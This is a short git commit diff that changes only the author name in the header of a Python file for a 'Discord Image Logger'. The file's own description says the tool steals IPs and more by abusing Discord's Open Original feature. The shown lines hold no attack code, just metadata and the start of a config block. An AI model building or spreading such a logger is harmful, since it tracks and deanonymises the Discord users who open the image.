d9e2e4358c26cec54c4a4361d86729b3ea5274b9
1nonlywizzler <165366346+Funkaarfam@users.noreply.github.com>
2025-03-09 09:35:34 +0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger-Made By Wizzler"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "Fahdii"
 
 config = {
     # BASE CONFIG #
